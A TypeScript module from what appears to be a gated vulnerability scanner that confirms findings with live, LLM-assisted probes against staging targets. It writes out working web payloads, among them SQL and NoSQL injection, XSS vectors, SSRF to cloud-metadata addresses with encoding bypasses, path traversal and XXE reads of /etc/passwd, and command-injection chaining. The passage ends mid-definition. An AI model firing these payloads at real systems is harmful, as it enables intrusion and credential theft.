/**
 * Layer 3b — LIVE DAST confirmation (premium, OFF by default, heavily gated).
 *
 * A recon+exploit agent that fires crafted, NON-destructive probes at an
 * approver-authorized, allowlisted STAGING target and captures the full
 * request/response transcript as proof. Every probe passes through {@link ScopeGuard}
 * (kill switch, allowlist, production block, rate/blast-radius caps, egress guard)
 * before it leaves the process. Authenticated flows use a browser driver
 * (playwright-core by default, injected in tests). Failure to confirm live never
 * loses the static proof — the caller keeps whichever is stronger.
 *
 * E3 — ADAPTIVE exploit agent, layered ALONGSIDE the fixed single-payload probe
 * above (not a replacement): `craftProbes`/`oracle` still run FIRST for every
 * live-eligible finding — fast, zero LLM cost, and resolves the large majority
 * of cases cleanly (a clean hit or a clean miss). Only when that fixed attempt's
 * verdict is AMBIGUOUS (`isAmbiguous` below — e.g. a 5xx, a generic error/stack
 * leak, or a filter-block signal that suggests the payload reached something
 * interesting without tripping the oracle) does `runAdaptiveLoop` engage: it asks
 * `deps.llm` (confirmation-tier, low effort) to pick ONE variant id from a small,
 * hardcoded, per-category `PAYLOAD_VARIANTS` catalog — recognizable exploit-
 * technique mutations (a different SQL comment style, a UNION column probe, an
 * encoded SSRF IP literal, …), never free-form model-authored payloads — sends
 * it through the SAME `ScopeGuard` gate as every other probe, re-scores with
 * `oracle`, and repeats up to `MAX_ADAPTIVE_ROUNDS` times (a hard cap independent
 * of the gateway's own pre-call budget guard, defense in depth). The kill switch
 * is re-checked at the top of every round AND immediately after every LLM call
 * returns, so an activation mid-investigation halts probing before the next
 * request ever leaves the process.
 */
import {
  KillSwitchActivatedError,
  type AppMap,
  type Category,
  type HttpExchange,
  type LLMRequest,
  type ProbableFinding,
  type Route,
} from "@montr/contracts";
import { extractParam } from "./taxonomy.js";
import { assembleConfirmed } from "./static.js";
import { agentAudit, msg, safeAppend } from "./audit.js";
import type {
  AuthenticatedSession,
  ConfirmDeps,
  ConfirmInput,
  LiveConfirmOutcome,
  LiveHttpResponse,
  LiveHttpTransport,
  BrowserDriver,
} from "./types.js";
import type { ScopeGuard } from "./guard.js";

/**
 * Categories with a SAFE, high-signal live oracle. Others stay static-only.
 * `idor` and `broken_access_control` have NO static data-flow proof at all
 * (they are not in `DATAFLOW_SINK_KINDS` — see `taxonomy.ts`), so live DAST is
 * currently the ONLY path that can ever confirm them (A9).
 */
export const LIVE_CONFIRMABLE_CATEGORIES = new Set<Category>([
  "sql_injection",
  "nosql_injection",
  "xss",
  "open_redirect",
  "ssrf",
  "idor",
  "broken_access_control",
  "path_traversal",
  "command_injection",
  "xxe",
  "insecure_deserialization",
]);

export function isLiveEligible(category: Category): boolean {
  return LIVE_CONFIRMABLE_CATEGORIES.has(category);
}

interface Probe {
  request: { method: string; url: string; headers?: Record<string, string>; body?: string };
  role: "baseline" | "payload" | "adaptive_payload";
  marker?: string;
  note: string;
}

const MAX_SNIPPET = 512;
const REDACTED_HEADERS = new Set(["authorization", "cookie", "set-cookie", "x-api-key"]);

function truncate(s: string, n = MAX_SNIPPET): string {
  return s.length > n ? `${s.slice(0, n)}…[truncated ${s.length - n} chars]` : s;
}

/** Copy headers into the transcript, redacting secret-bearing values. */
function safeHeaders(headers?: Record<string, string>): Record<string, string> | undefined {
  if (!headers) return undefined;
  const out: Record<string, string> = {};
  for (const [k, v] of Object.entries(headers)) {
    out[k] = REDACTED_HEADERS.has(k.toLowerCase()) ? "[redacted]" : v;
  }
  return out;
}

function hostOfUrl(url: string): string {
  try {
    return new URL(url).host;
  } catch {
    return url;
  }
}

function isAbort(err: unknown): boolean {
  if (err instanceof KillSwitchActivatedError) return true;
  const e = err as { name?: string; code?: string } | null;
  return e?.name === "AbortError" || e?.code === "UND_ERR_ABORTED";
}

function asKill(err: unknown): KillSwitchActivatedError {
  return err instanceof KillSwitchActivatedError
    ? err
    : new KillSwitchActivatedError("DAST probe aborted by kill switch");
}

function routeFor(appMap: AppMap, finding: ProbableFinding): Route | undefined {
  if (finding.routeId) {
    const byId = appMap.routes.find((r) => r.id === finding.routeId);
    if (byId) return byId;
  }
  return appMap.routes.find((r) => r.handler?.file === finding.location.file);
}

function paramFor(appMap: AppMap, finding: ProbableFinding, fallback: string): string {
  const routeId = finding.routeId;
  const src =
    (routeId ? appMap.taintSources.find((s) => s.routeId === routeId) : undefined) ??
    appMap.taintSources.find((s) => s.location.file === finding.location.file);
  return extractParam(src?.description) ?? fallback;
}

/** Substitute dynamic route segments (`[id]`, `:id`) with a benign concrete value. */
function concretePath(path: string): string {
  return path.replace(/\[[^\]]+\]/g, "1").replace(/:([A-Za-z0-9_]+)/g, "1");
}

const CATEGORY_DEFAULT_PARAM: Partial<Record<Category, string>> = {
  sql_injection: "q",
  nosql_injection: "q",
  xss: "q",
  open_redirect: "next",
  ssrf: "url",
  idor: "id",
  path_traversal: "file",
  command_injection: "cmd",
};

/** Craft the (non-destructive) probe set for a live-confirmable finding. Most
 * categories are GET-only query-param probes; `xxe` and `insecure_deserialization`
 * require a request BODY (their sinks only trigger on parsed request bodies), so
 * those two issue a POST — still non-mutating in intent (no state-changing gadget
 * is ever sent, only a benign/malformed body that proves the sink is reached). */
function craftProbes(
  appMap: AppMap,
  finding: ProbableFinding,
  route: Route | undefined,
  target: string,
  session?: AuthenticatedSession,
): Probe[] {
  const path = concretePath(route?.path ?? "/");
  const param = paramFor(appMap, finding, CATEGORY_DEFAULT_PARAM[finding.category] ?? "q");
  const headers: Record<string, string> = { accept: "*/*", ...(session?.headers ?? {}) };
  const enc = encodeURIComponent;
  const at = (query: string): string => `${target.replace(/\/$/, "")}${path}?${query}`;
  const plainUrl = `${target.replace(/\/$/, "")}${path}`;

  switch (finding.category) {
    case "sql_injection":
      return [
        {
          request: { method: "GET", url: at(`${enc(param)}=montr_baseline`), headers },
          role: "baseline",
          note: "baseline request (benign value)",
        },
        {
          request: { method: "GET", url: at(`${enc(param)}=${enc("montr' OR '1'='1")}`), headers },
          role: "payload",
          note: "boolean-based SQLi payload (' OR '1'='1)",
        },
      ];
    case "nosql_injection": {
      // Delivered the same way the app already parses this param (query string),
      // so the payload must be a real Mongo/NoSQL OPERATOR, not a SQL string. Most
      // Node query-string parsers (qs/Express) turn `?q[$ne]=x` into the object
      // `{ q: { $ne: "x" } }`, which is the classic bracket-notation NoSQL
      // injection vector against a query built as `{ [field]: req.query[field] }`.
      const opParam = `${param}[$ne]`;
      return [
        {
          request: { method: "GET", url: at(`${enc(param)}=montr_baseline`), headers },
          role: "baseline",
          note: "baseline request (benign value)",
        },
        {
          request: {
            method: "GET",
            url: at(`${enc(opParam)}=${enc("montr_nosqli_disallowed")}`),
            headers,
          },
          role: "payload",
          note: "NoSQL operator-injection payload ($ne bracket-notation query param)",
        },
      ];
    }
    case "xss": {
      const marker = `montrXSS${finding.id.replace(/[^a-z0-9]/gi, "")}`;
      const payload = `<script>${marker}</script>`;
      return [
        {
          request: { method: "GET", url: at(`${enc(param)}=${enc(payload)}`), headers },
          role: "payload",
          marker,
          note: "reflected-XSS payload",
        },
      ];
    }
    case "open_redirect": {
      const marker = "https://montr-oob.example/redirected";
      return [
        {
          request: { method: "GET", url: at(`${enc(param)}=${enc(marker)}`), headers },
          role: "payload",
          marker,
          note: "open-redirect payload (off-site next=)",
        },
      ];
    }
    case "ssrf":
      return [
        {
          request: {
            method: "GET",
            url: at(`${enc(param)}=${enc("https://example.com/health")}`),
            headers,
          },
          role: "baseline",
          note: "baseline request (benign external URL)",
        },
        {
          request: {
            method: "GET",
            url: at(`${enc(param)}=${enc("http://169.254.169.254/latest/meta-data/")}`),
            headers,
          },
          role: "payload",
          note: "SSRF payload targeting the cloud-metadata address",
        },
      ];
    case "idor":
      return [
        {
          request: { method: "GET", url: at(`${enc(param)}=1`), headers },
          role: "baseline",
          note: "baseline request (id=1)",
        },
        {
          request: { method: "GET", url: at(`${enc(param)}=2`), headers },
          role: "payload",
          note: "IDOR payload — same session, a different resource id (id=2)",
        },
      ];
    case "broken_access_control": {
      // Only meaningful when we hold real session credentials to strip — a
      // public route has no auth boundary for this probe to test (fail-safe).
      if (!session?.headers || Object.keys(session.headers).length === 0) return [];
      return [
        {
          request: { method: "GET", url: plainUrl, headers },
          role: "baseline",
          note: "baseline request WITH session credentials",
        },
        {
          request: { method: "GET", url: plainUrl, headers: { accept: "*/*" } },
          role: "payload",
          note: "authz-bypass payload — identical request with session/auth headers stripped",
        },
      ];
    }
    case "path_traversal":
      return [
        {
          request: { method: "GET", url: at(`${enc(param)}=${enc("readme.txt")}`), headers },
          role: "baseline",
          note: "baseline request (benign filename)",
        },
        {
          request: {
            method: "GET",
            url: at(`${enc(param)}=${enc("../../../../../../etc/passwd")}`),
            headers,
          },
          role: "payload",
          note: "path-traversal payload (../ sequence targeting /etc/passwd)",
        },
      ];
    case "command_injection": {
      const marker = `montrCMD${finding.id.replace(/[^a-z0-9]/gi, "")}`;
      return [
        {
          request: { method: "GET", url: at(`${enc(param)}=montr_baseline`), headers },
          role: "baseline",
          note: "baseline request (benign value)",
        },
        {
          request: {
            method: "GET",
            url: at(`${enc(param)}=${enc(`montr_baseline; echo ${marker}`)}`),
            headers,
          },
          role: "payload",
          marker,
          note: "command-injection payload (chained `echo` of a unique marker)",
        },
      ];
    }
    case "xxe": {
      const xmlHeaders = { ...headers, "content-type": "application/xml" };
      return [
        {
          request: {
            method: "POST",
            url: plainUrl,
            headers: xmlHeaders,
            body: '<?xml version="1.0"?><root><value>montr_baseline</value></root>',
          },
          role: "baseline",
          note: "baseline XML POST (benign body, no external entity)",
        },
        {
          request: {
            method: "POST",
            url: plainUrl,
            headers: xmlHeaders,
            body:
              '<?xml version="1.0"?><!DOCTYPE montr [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' +
              "<root><value>&xxe;</value></root>",
          },
          role: "payload",
          note: "XXE payload (external entity resolving /etc/passwd — read-only, non-destructive)",
        },
      ];
    }
    case "insecure_deserialization": {
      // Non-destructive by design: NO gadget chain is ever sent (that could pop a
      // shell). The payload is a malformed/typed object whose only possible
      // effect is a deserializer-layer error or a type-name echo — proof the
      // sink parses attacker-controlled data, without ever executing one.
      const marker = `montrDeser${finding.id.replace(/[^a-z0-9]/gi, "")}`;
      const jsonHeaders = { ...headers, "content-type": "application/json" };
      return [
        {
          request: {
            method: "POST",
            url: plainUrl,
            headers: jsonHeaders,
            body: JSON.stringify({ value: "montr_baseline" }),
          },
          role: "baseline",
          note: "baseline JSON POST (benign body)",
        },
        {
          request: {
            method: "POST",
            url: plainUrl,
            headers: jsonHeaders,
            body: `{"@type":"${marker}","value":"montr_baseline","__proto__":{"polluted":true}}`,
          },
          role: "payload",
          marker,
          note: "deserialization-probe payload (malformed typed object; no gadget chain)",
        },
      ];
    }
    default:
      return [];
  }
}

interface Collected {
  probe: Probe;
  response: LiveHttpResponse;
}

/** Error-page/leak markers proving SQL or NoSQL injection reached the query layer. */
const INJECTION_ERROR_MARKERS = [
  "sql syntax",
  "syntax error",
  "sqlite",
  "sqlstate",
  "pg::",
  "ora-",
  "you have an error in your sql",
  "unclosed quotation",
  "mongoerror",
  "bsonerror",
  "castmongoerror",
  "e11000",
  "cast to string failed",
];

const SSRF_MARKERS = [
  "ami-id",
  "instance-id",
  "iam/security-credentials",
  "security-credentials",
  "computemetadata",
  "metadata-flavor",
  "local-ipv4",
  "instance-action",
];

const DENIAL_MARKERS = [
  "forbidden",
  "unauthorized",
  "access denied",
  "permission denied",
  "not found",
  "no access",
  "not allowed",
];

/** Local file-disclosure signature (POSIX `/etc/passwd`). Shared by path-traversal + XXE. */
const FILE_DISCLOSURE_MARKERS = ["root:x:0:0:", "daemon:x:", "bin:x:", "nobody:x:"];

const DESERIALIZATION_ERROR_MARKERS = [
  "invalidclassexception",
  "classnotfoundexception",
  "unpicklingerror",
  "malformed",
  "could not deserialize",
  "deserialization",
  "illegal argument: class",
  "not a valid",
  "unexpected token",
];

interface Verdict {
  success: boolean;
  note: string;
}

/** Category-specific success oracle over the captured exchanges. */
function oracle(finding: ProbableFinding, collected: Collected[]): Verdict {
  // Evaluate against the MOST RECENT payload attempt (`.reverse().find`, not
  // `.find`) so a later adaptive-loop round (`role: "adaptive_payload"`)
  // correctly supersedes the original fixed payload for scoring — the fixed
  // path itself only ever produces one payload entry, so this is a no-op for
  // every case that never engages the adaptive loop.
  const payload = [...collected]
    .reverse()
    .find((c) => c.probe.role === "payload" || c.probe.role === "adaptive_payload");
  const baseline = collected.find((c) => c.probe.role === "baseline");
  if (!payload) return { success: false, note: "no payload response captured" };
  const { response } = payload;
  const body = response.body ?? "";
  const lower = body.toLowerCase();

  switch (finding.category) {
    case "sql_injection":
    case "nosql_injection": {
      if (INJECTION_ERROR_MARKERS.some((m) => lower.includes(m))) {
        return {
          success: true,
          note: "DB error leaked in the response (injection reached the query)",
        };
      }
      if (response.status >= 200 && response.status < 300 && baseline) {
        if (body.length >= baseline.response.body.length + 20) {
          return {
            success: true,
            note: "boolean-true/operator payload returned materially more data than the baseline",
          };
        }
      }
      return {
        success: false,
        note: "no injection signal (response matched baseline, no error leak)",
      };
    }
    case "xss": {
      const marker = payload.probe.marker ?? "";
      if (marker && body.includes(`<script>${marker}</script>`)) {
        return { success: true, note: "payload reflected unescaped in the response body" };
      }
      if (marker && body.includes(`&lt;script&gt;${marker}`)) {
        return { success: false, note: "payload reflected but HTML-escaped (not exploitable)" };
      }
      return { success: false, note: "payload not reflected" };
    }
    case "open_redirect": {
      const marker = payload.probe.marker ?? "";
      const location = response.headers?.location ?? response.headers?.Location ?? "";
      if (
        response.status >= 300 &&
        response.status < 400 &&
        marker &&
        location.startsWith(marker.split("/").slice(0, 3).join("/"))
      ) {
        return {
          success: true,
          note: `redirect Location honored the attacker-controlled target (${response.status})`,
        };
      }
      return { success: false, note: "no off-site redirect observed" };
    }
    case "ssrf": {
      if (SSRF_MARKERS.some((m) => lower.includes(m))) {
        return {
          success: true,
          note: "response leaked cloud-metadata contents fetched via the server-side request",
        };
      }
      return {
        success: false,
        note: "no metadata-service signal (server did not appear to fetch the internal URL)",
      };
    }
    case "idor": {
      if (!baseline) return { success: false, note: "no baseline response captured" };
      const denied = DENIAL_MARKERS.some((m) => lower.includes(m));
      const ok = response.status >= 200 && response.status < 300;
      if (ok && !denied && body.trim().length > 0 && body !== baseline.response.body) {
        return {
          success: true,
          note: "a different resource id returned distinct data with no ownership check (IDOR)",
        };
      }
      return {
        success: false,
        note: "access to the other resource id was denied or unchanged (no IDOR signal)",
      };
    }
    case "broken_access_control": {
      if (!baseline) return { success: false, note: "no baseline response captured" };
      const baselineOk = baseline.response.status >= 200 && baseline.response.status < 300;
      const payloadOk = response.status >= 200 && response.status < 300;
      if (baselineOk && payloadOk) {
        return {
          success: true,
          note: "the route returned a successful response even after auth/session headers were stripped (missing access control)",
        };
      }
      return { success: false, note: "access without credentials was correctly denied" };
    }
    case "path_traversal":
    case "xxe": {
      if (FILE_DISCLOSURE_MARKERS.some((m) => lower.includes(m))) {
        return {
          success: true,
          note: "payload disclosed local file contents (/etc/passwd signature), proving the traversal/entity reached the filesystem",
        };
      }
      return { success: false, note: "no file-disclosure signal in the response" };
    }
    case "command_injection": {
      const marker = payload.probe.marker ?? "";
      if (marker && body.includes(marker)) {
        return {
          success: true,
          note: "injected shell command executed — its marker output was reflected in the response",
        };
      }
      return { success: false, note: "marker not reflected; no command-injection signal" };
    }
    case "insecure_deserialization": {
      const marker = (payload.probe.marker ?? "").toLowerCase();
      if (
        DESERIALIZATION_ERROR_MARKERS.some((m) => lower.includes(m)) ||
        (marker && lower.includes(marker))
      ) {
        return {
          success: true,
          note: "malformed typed payload triggered a deserialization-layer error/echo, proving attacker-controlled data reaches the deserializer",
        };
      }
      return { success: false, note: "no deserialization-error or type-echo signal" };
    }
    default:
      return { success: false, note: "category has no live oracle" };
  }
}

/* ============================ E3: adaptive exploit agent ============================ */

/**
 * Hard round cap, INDEPENDENT of the gateway's own pre-call budget guard
 * (`packages/llm-gateway/src/gateway.ts`'s `assertPreCallBudget`, A2). Defense
 * in depth: even a scan with an unmetered/misconfigured budget can never spend
 * more than this many extra LLM calls investigating one ambiguous finding.
 */
const MAX_ADAPTIVE_ROUNDS = 3;

/** Generic signals of "something interesting happened but the oracle didn't fire" —
 * a stack trace, an unhandled exception, or a raw 5xx are worth another look
 * regardless of category. */
const GENERIC_ERROR_MARKERS = [
  "exception",
  "stack trace",
  "traceback",
  "internal server error",
  "unexpected error",
  "unhandled",
  "at line",
  "warning:",
];

/** SSRF-specific: signals the request was blocked by an obvious naive filter
 * (worth trying a different IP encoding) rather than genuinely never leaving. */
const FILTER_BLOCK_MARKERS = [
  "blocked",
  "not allowed",
  "invalid url",
  "invalid host",
  "disallowed",
  "filtered",
  "forbidden host",
];

/**
 * Whether the FIXED probe's verdict is ambiguous — not a clean hit (already
 * handled by the caller before this is ever consulted) and not a clean miss
 * either: the response shows a signal suggesting the payload reached something
 * real without tripping the category's fixed oracle. Only an ambiguous verdict
 * is worth spending an LLM call to investigate further (§3 of the design: the
 * fixed path alone resolves the large majority of probes for zero LLM cost).
 */
function isAmbiguous(finding: ProbableFinding, collected: Collected[]): boolean {
  const payload = [...collected]
    .reverse()
    .find((c) => c.probe.role === "payload" || c.probe.role === "adaptive_payload");
  if (!payload) return false; // nothing was even sent — no signal to reason about
  const { response } = payload;
  const body = (response.body ?? "").toLowerCase();
  const baseline = collected.find((c) => c.probe.role === "baseline");

  // A server error on the payload attempt (but not the baseline) is always
  // worth a closer look, for every live-eligible category.
  if (response.status >= 500 && !(baseline && baseline.response.status >= 500)) return true;

  switch (finding.category) {
    case "sql_injection":
    case "nosql_injection":
    case "command_injection":
    case "path_traversal":
    case "xxe":
    case "insecure_deserialization":
      return GENERIC_ERROR_MARKERS.some((m) => body.includes(m));
    case "ssrf":
      return (
        FILTER_BLOCK_MARKERS.some((m) => body.includes(m)) ||
        response.status === 400 ||
        response.status === 403
      );
    case "xss": {
      const marker = (payload.probe.marker ?? "").toLowerCase();
      if (!marker || !body.includes(marker)) return false;
      // Reflected in SOME form, but the fixed oracle already ruled out both the
      // exact unescaped hit and the fully-HTML-escaped miss — a transformed
      // reflection (e.g. the tag stripped but the marker text surviving) is
      // ambiguous: a different vector might still land.
      const unescapedHit = body.includes(`<script>${marker}</script>`);
      const escapedMiss = body.includes(`&lt;script&gt;${marker}`);
      return !unescapedHit && !escapedMiss;
    }
    case "open_redirect": {
      const location = (
        response.headers?.location ??
        response.headers?.Location ??
        ""
      ).toLowerCase();
      // A redirect happened (so the param clearly influenced Location) but the
      // fixed oracle rejected it — likely a partial-encoding acceptance worth
      // retrying with a different bypass shape.
      return response.status >= 300 && response.status < 400 && location.length > 0;
    }
    case "idor":
    case "broken_access_control":
      // A non-2xx/non-clean-denial status (e.g. a 500, a malformed 200 with an
      // error body) on the payload attempt suggests the access-control check
      // itself misbehaved rather than cleanly allowing or denying.
      return GENERIC_ERROR_MARKERS.some((m) => body.includes(m));
    default:
      return false;
  }
}

interface VariantBuildCtx {
  target: string;
  path: string;
  plainUrl: string;
  param: string;
  headers: Record<string, string>;
  marker: string;
}

interface PayloadVariant {
  /** Stable id — the ONLY thing the model is allowed to choose (a narrow enum,
   * never free text), so it can never invent a payload outside this catalog. */
  id: string;
  /** Short label of the recognizable exploit-technique family, shown to the model. */
  technique: string;
  build(ctx: VariantBuildCtx): Probe;
}

const enc = encodeURIComponent;

function variantUrl(ctx: VariantBuildCtx, query: string): string {
  return `${ctx.target.replace(/\/$/, "")}${ctx.path}?${query}`;
}

/**
 * Bounded, hardcoded, per-category payload-MUTATION space (A9/E3): each entry is
 * a recognizable variant within the same exploit-technique family as the fixed
 * probe for that category, never an arbitrary model-authored payload. The
 * adaptive loop's only choice is WHICH of these pre-vetted ids to try next.
 */
const PAYLOAD_VARIANTS: Partial<Record<Category, readonly PayloadVariant[]>> = {
  sql_injection: [
    {
      id: "comment_dash",
      technique: "SQLi — alternate end-of-line comment style (-- ) instead of a bare quote",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc("montr' OR '1'='1' -- -")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive SQLi payload (-- comment-style terminator)",
      }),
    },
    {
      id: "boolean_blind_hash",
      technique: "SQLi — numeric-context boolean-blind form with a # (MySQL-style) comment",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc("montr' OR 1=1#")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive SQLi payload (# comment, numeric boolean-blind)",
      }),
    },
    {
      id: "union_probe",
      technique: "SQLi — UNION SELECT NULL column probe, used when a mismatch error is suspected",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc("montr' UNION SELECT NULL-- -")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive SQLi payload (UNION-based column probe)",
      }),
    },
    {
      id: "time_based_blind",
      technique:
        "SQLi — time-based blind probe with a zero-second sleep (non-destructive: no real delay)",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc("montr' OR SLEEP(0)-- -")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive SQLi payload (time-based blind, SLEEP(0) — non-destructive)",
      }),
    },
  ],
  nosql_injection: [
    {
      id: "gt_operator",
      technique: "NoSQL — $gt operator (always-true comparison) instead of $ne",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(`${ctx.param}[$gt]`)}=${enc("")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive NoSQL payload ($gt bracket-notation operator)",
      }),
    },
    {
      id: "regex_operator",
      technique: "NoSQL — $regex match-all operator",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(`${ctx.param}[$regex]`)}=${enc(".*")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive NoSQL payload ($regex bracket-notation operator)",
      }),
    },
    {
      id: "exists_operator",
      technique: "NoSQL — $exists operator",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(`${ctx.param}[$exists]`)}=${enc("true")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive NoSQL payload ($exists bracket-notation operator)",
      }),
    },
  ],
  ssrf: [
    {
      id: "decimal_ip",
      technique: "SSRF — decimal-encoded IP literal bypassing string-based metadata-IP filters",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc("http://2852039166/latest/meta-data/")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive SSRF payload (decimal IP encoding)",
      }),
    },
    {
      id: "ipv6_mapped",
      technique: "SSRF — IPv6-mapped-IPv4 literal encoding",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(
            ctx,
            `${enc(ctx.param)}=${enc("http://[::ffff:169.254.169.254]/latest/meta-data/")}`,
          ),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive SSRF payload (IPv6-mapped-IPv4 encoding)",
      }),
    },
    {
      id: "alt_cloud_metadata",
      technique:
        "SSRF — alternate cloud-metadata hostname (GCP) in case the AWS IP literal is filtered",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(
            ctx,
            `${enc(ctx.param)}=${enc("http://metadata.google.internal/computeMetadata/v1/")}`,
          ),
          headers: { ...ctx.headers, "metadata-flavor": "Google" },
        },
        role: "adaptive_payload",
        note: "adaptive SSRF payload (GCP metadata hostname)",
      }),
    },
  ],
  xss: [
    {
      id: "attr_breakout",
      technique: "XSS — attribute-context breakout event handler instead of a <script> tag",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc(`" onmouseover=${ctx.marker} x="`)}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        marker: ctx.marker,
        note: "adaptive XSS payload (attribute breakout)",
      }),
    },
    {
      id: "img_vector",
      technique: "XSS — <img onerror> vector",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc(`<img src=x onerror=${ctx.marker}>`)}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        marker: ctx.marker,
        note: "adaptive XSS payload (<img onerror> vector)",
      }),
    },
    {
      id: "svg_vector",
      technique: "XSS — <svg onload> vector",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc(`<svg onload=${ctx.marker}>`)}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        marker: ctx.marker,
        note: "adaptive XSS payload (<svg onload> vector)",
      }),
    },
  ],
  open_redirect: [
    {
      id: "protocol_relative",
      technique: "open-redirect — protocol-relative URL (//host/path)",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc("//montr-oob.example/redirected")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        marker: "//montr-oob.example",
        note: "adaptive open-redirect payload (protocol-relative)",
      }),
    },
    {
      id: "backslash_bypass",
      technique: "open-redirect — backslash-as-slash bypass",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc("/\\montr-oob.example/redirected")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        marker: "/\\montr-oob.example",
        note: "adaptive open-redirect payload (backslash bypass)",
      }),
    },
    {
      id: "at_sign_bypass",
      technique: "open-redirect — userinfo @ bypass on a trusted-looking prefix",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(
            ctx,
            `${enc(ctx.param)}=${enc("https://trusted.example@montr-oob.example/redirected")}`,
          ),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        marker: "https://trusted.example@montr-oob.example",
        note: "adaptive open-redirect payload (userinfo @ bypass)",
      }),
    },
  ],
  idor: [
    {
      id: "far_id",
      technique: "IDOR — a numerically distant resource id",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=999`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive IDOR payload (distant id=999)",
      }),
    },
    {
      id: "negative_id",
      technique: "IDOR — a negative resource id (boundary/type-confusion case)",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=-1`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive IDOR payload (negative id=-1)",
      }),
    },
  ],
  broken_access_control: [
    {
      id: "strip_cookie_only",
      technique: "authz-bypass — strip only the session cookie, keep other auth headers",
      build: (ctx) => {
        const { cookie: _cookie, ...rest } = ctx.headers;
        return {
          request: { method: "GET", url: ctx.plainUrl, headers: rest },
          role: "adaptive_payload",
          note: "adaptive authz-bypass payload (cookie stripped only)",
        };
      },
    },
    {
      id: "strip_authorization_only",
      technique: "authz-bypass — strip only the Authorization header, keep the cookie",
      build: (ctx) => {
        const { authorization: _authorization, ...rest } = ctx.headers;
        return {
          request: { method: "GET", url: ctx.plainUrl, headers: rest },
          role: "adaptive_payload",
          note: "adaptive authz-bypass payload (Authorization header stripped only)",
        };
      },
    },
  ],
  path_traversal: [
    {
      id: "url_encoded_slashes",
      technique: "path-traversal — URL-encoded slash sequence (%2f) bypassing naive '../' filters",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(
            ctx,
            `${enc(ctx.param)}=${enc("..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd")}`,
          ),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive path-traversal payload (URL-encoded slashes)",
      }),
    },
    {
      id: "double_encoded",
      technique: "path-traversal — double URL-encoded sequence bypassing single-decode filters",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(
            ctx,
            `${enc(ctx.param)}=${enc("..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd")}`,
          ),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive path-traversal payload (double URL-encoded slashes)",
      }),
    },
    {
      id: "null_byte",
      technique: "path-traversal — legacy null-byte suffix bypass",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc("../../../../../../etc/passwd%00.txt")}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        note: "adaptive path-traversal payload (null-byte suffix)",
      }),
    },
  ],
  command_injection: [
    {
      id: "pipe_style",
      technique: "command-injection — pipe chaining (|) instead of a semicolon",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc(`montr_baseline | echo ${ctx.marker}`)}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        marker: ctx.marker,
        note: "adaptive command-injection payload (pipe chaining)",
      }),
    },
    {
      id: "backtick_style",
      technique: "command-injection — backtick command substitution",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc(`montr_baseline \`echo ${ctx.marker}\``)}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        marker: ctx.marker,
        note: "adaptive command-injection payload (backtick substitution)",
      }),
    },
    {
      id: "dollar_paren_style",
      technique: "command-injection — $() command substitution",
      build: (ctx) => ({
        request: {
          method: "GET",
          url: variantUrl(ctx, `${enc(ctx.param)}=${enc(`montr_baseline $(echo ${ctx.marker})`)}`),
          headers: ctx.headers,
        },
        role: "adaptive_payload",
        marker: ctx.marker,
